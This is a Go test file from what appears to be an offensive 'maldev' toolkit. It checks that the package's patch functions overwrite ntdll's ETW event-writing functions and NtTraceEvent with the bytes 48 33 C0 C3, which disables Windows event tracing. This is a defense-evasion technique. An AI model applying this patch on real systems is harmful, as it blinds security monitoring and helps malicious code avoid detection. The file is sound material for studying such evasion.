//go:build windows

package etw

import (
	"testing"
	"unsafe"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/oioio-space/maldev/testutil"
	"github.com/oioio-space/maldev/win/api"
)

// TestNtTraceEventCallerMatrix tests PatchNtTraceEvent with all 4 Caller methods.
func TestNtTraceEventCallerMatrix(t *testing.T) {
	testutil.RequireIntrusive(t)

	proc := api.Ntdll.NewProc("NtTraceEvent")
	if err := proc.Find(); err != nil {
		t.Skip("NtTraceEvent not present")
	}

	for _, c := range testutil.CallerMethods(t) {
		t.Run(c.Name, func(t *testing.T) {
			addr := proc.Addr()
			require.NoError(t, PatchNtTraceEvent(c.Caller))
			patched := (*[4]byte)(unsafe.Pointer(addr))
			assert.Equal(t, byte(0x48), patched[0], "NtTraceEvent[0]")
			assert.Equal(t, byte(0x33), patched[1], "NtTraceEvent[1]")
			assert.Equal(t, byte(0xC0), patched[2], "NtTraceEvent[2]")
			assert.Equal(t, byte(0xC3), patched[3], "NtTraceEvent[3]")
		})
	}
}

// TestPatchAllCallerMatrix tests PatchAll (5 ETW functions + NtTraceEvent) with all 4 callers.
func TestPatchAllCallerMatrix(t *testing.T) {
	testutil.RequireIntrusive(t)

	for _, c := range testutil.CallerMethods(t) {
		t.Run(c.Name, func(t *testing.T) {
			require.NoError(t, PatchAll(c.Caller))
		})
	}
}

// TestPatchCallerMatrix tests ETW Patch with all 4 Caller methods,
// verifying all 5 ETW functions are patched to 48 33 C0 C3.
func TestPatchCallerMatrix(t *testing.T) {
	testutil.RequireIntrusive(t)

	names := []string{
		"EtwEventWrite",
		"EtwEventWriteEx",
		"EtwEventWriteFull",
		"EtwEventWriteString",
		"EtwEventWriteTransfer",
	}

	for _, c := range testutil.CallerMethods(t) {
		t.Run(c.Name, func(t *testing.T) {
			// Resolve addresses before patching.
			addrs := make(map[string]uintptr)
			for _, name := range names {
				proc := api.Ntdll.NewProc(name)
				if err := proc.Find(); err != nil {
					continue
				}
				addrs[name] = proc.Addr()
			}
			require.NotEmpty(t, addrs)

			require.NoError(t, Patch(c.Caller))

			for name, addr := range addrs {
				patched := (*[4]byte)(unsafe.Pointer(addr))
				assert.Equal(t, byte(0x48), patched[0], "%s[0]", name)
				assert.Equal(t, byte(0x33), patched[1], "%s[1]", name)
				assert.Equal(t, byte(0xC0), patched[2], "%s[2]", name)
				assert.Equal(t, byte(0xC3), patched[3], "%s[3]", name)
			}
		})
	}
}
